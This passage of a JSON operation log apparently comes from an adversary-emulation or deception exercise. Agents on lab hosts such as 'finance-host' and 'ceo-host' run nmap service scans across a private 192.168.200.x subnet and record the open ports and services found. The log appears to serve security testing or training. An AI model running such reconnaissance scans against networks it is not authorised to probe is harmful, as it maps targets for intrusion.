"host.remote.ip192.168.200.4", "created": "2023-10-03T20:19:10Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e8b50>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7207ea0b0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:10Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:19:10Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e84c0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e8940>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:10Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:19:10Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7209957e0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe720997ac0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:10Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:19:10Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720994d90>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe720994cd0>", "score": 1}], "host": "finance-host", "pin": 0, "paw": "hchyiu", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:18:44Z", "command": "nmap -sV --version-light -oX - 192.168.200.1,2,3,4,6,7,5", "facts": [{"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:11Z", "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:18:44Z"}, {"deadman": false, "finish": "2023-10-03T20:19:24Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "5f77a35b-9898-4f66-9e9e-fb18ec902538", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.2,3,4,5,6,7", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 11, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.2,3,4,5,6,7", "unique": "scan.remote.addr192.168.200.2,3,4,5,6,7", "created": "2023-10-03T20:19:12Z", "relationships": []}], "unique": "5f77a35b-9898-4f66-9e9e-fb18ec902538", "decide": "2023-10-03T20:19:12Z", "status": 0, "score": 1, "pid": "2868", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:19:24Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:19:24Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b9bd0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7208bbb20>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:19:24Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:19:24Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720af42b0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe720af6560>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:19:24Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:19:24Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720af78e0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe720af6080>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:19:24Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:19:24Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720af7190>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe720af6890>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:19:24Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:19:24Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720af44f0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe720af7160>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:24Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:19:24Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720af7940>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe720af5120>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:24Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:19:24Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720af4160>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe720af5b40>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:24Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:19:24Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720af7bb0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe720af43a0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:24Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:19:24Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720af5f00>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe720af5810>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:24Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:19:24Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720af71c0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe720af5720>", "score": 1}], "host": "ceo-host", "pin": 0, "paw": "xuyzjc", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:19:12Z", "command": "nmap -sV --version-light -oX - 192.168.200.2,3,4,5,6,7", "facts": [{"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": 